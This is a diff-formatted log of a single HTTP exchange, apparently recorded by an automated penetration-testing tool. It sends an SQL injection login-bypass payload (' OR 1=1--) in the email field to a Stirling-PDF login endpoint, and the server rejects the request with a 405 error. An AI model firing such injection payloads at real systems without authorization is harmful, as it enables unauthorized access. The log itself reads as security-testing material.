@@ -1,0 +1,25 @@
+REQUEST:
+POST https://stirling-pdf.baliprov.dev/auth/login
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+Content-Type: application/json
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+{"email": "' OR 1=1--", "password": "anything"}
+
+RESPONSE:
+HTTP 405
+Date: Wed, 25 Nov 2026 00:23:48 GMT
+Content-Type: application/problem+json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Access-Control-Request-Headers
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+
+{"detail":"HTTP method POST is not supported for this endpoint. Supported methods: GET","instance":"/auth/login","status":405,"title":"HTTP Method Not Allowed","type":"/errors/method-not-allowed","timestamp":"2026-11-25T00:23:48.163859476Z","path":"/auth/login","title":"HTTP Method Not Allowed","method":"POST","supportedMethods":["GET"],"hints":["Change the HTTP method to one of the supported methods.","Consult the API documentation for the correct method.","If using a tool like curl or Postman, update the method accordingly."],"actionRequired":"Use one of the supported HTTP methods."}
